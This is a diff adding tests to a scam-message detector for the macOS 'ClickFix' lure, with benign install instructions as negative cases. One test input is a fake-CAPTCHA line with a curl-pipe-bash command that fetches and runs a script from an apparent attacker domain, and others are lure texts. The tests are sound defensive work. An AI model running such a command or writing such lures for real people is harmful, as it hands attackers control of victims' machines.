@@ -686,6 +686,56 @@ describe("threat-intel roadmap 2026-07-05 (#73-#78)", () => {
     expect(result.flags.some((f) => f.includes("Press Win+R"))).toBe(true);
   });
 
+  // ── ClickFix macOS variant (D3 / #143 / ACSC ASC-2026-0809) ────────────────
+  // Same tactic as Win+R, different keystroke. The hard part is the negative
+  // case: "open Terminal" and `curl | bash` are ordinary developer phrases, so
+  // the rule requires a delivery cue AND a clipboard/fake-CAPTCHA co-signal.
+
+  it("detects the macOS Spotlight paste lure in SMS (D3 / #143)", () => {
+    const result = checkSms(
+      "Verification required: press Cmd+Space, type Terminal, then paste the command below to prove you're human.",
+    );
+    expect(result.flags.some((f) => f.includes("macOS ClickFix variant"))).toBe(true);
+    expect(result.score).toBeGreaterThanOrEqual(50);
+  });
+
+  it("detects a curl-pipe-bash command paired with fake-CAPTCHA framing (D3 / #143)", () => {
+    const result = checkCustom(
+      "Confirm you are not a robot — copy this and run it: curl -s https://verify-fix.cyou/f.sh | bash",
+    );
+    expect(result.flags.some((f) => f.includes("macOS ClickFix variant"))).toBe(true);
+  });
+
+  it("detects the Terminal paste lure in pasted page content (D3 / #143)", () => {
+    const result = checkCustom(
+      "Browser error detected. To fix it, open Terminal and paste the following command.",
+    );
+    expect(result.flags.some((f) => f.includes("macOS ClickFix variant"))).toBe(true);
+  });
+
+  it("does not fire on legitimate CLI install instructions (D3 / #143)", () => {
+    // The whole point of the co-signal requirement. A README says "run this in
+    // Terminal" and stops; it never adds a human-verification framing.
+    const benign = [
+      "To install the CLI, open Terminal and run: brew install ripgrep",
+      "Install with: curl -fsSL https://get.example.dev/install.sh | sh",
+      "Run in terminal: npm install && npm test",
+    ];
+    for (const text of benign) {
+      const flags = checkCustom(text).flags.join(" | ");
+      expect({ text, hit: flags.includes("macOS ClickFix variant") }).toEqual({ text, hit: false });
+    }
+  });
+
+  it("scores the macOS ClickFix variant once when both variants appear (D3 / #143)", () => {
+    // The Win+R and macOS branches are mutually exclusive, so a cross-platform
+    // lure gets +50, not +100 for one instruction.
+    const both = checkSms("Press Win+R (Windows) or Cmd+Space and open Terminal, then paste this command.");
+    const winOnly = checkSms("Press Win+R, then paste this command.");
+    expect(both.flags.filter((f) => f.includes("ClickFix")).length).toBe(1);
+    expect(both.score).toBeLessThanOrEqual(winOnly.score + 15);
+  });
+
   // ── AU customs / import-duty parcel lures (D2 / #142 / ABF 6 Aug 2026) ─────
 
   it("detects customs-clearance parcel lures in AU (D2 / #142)", () => {
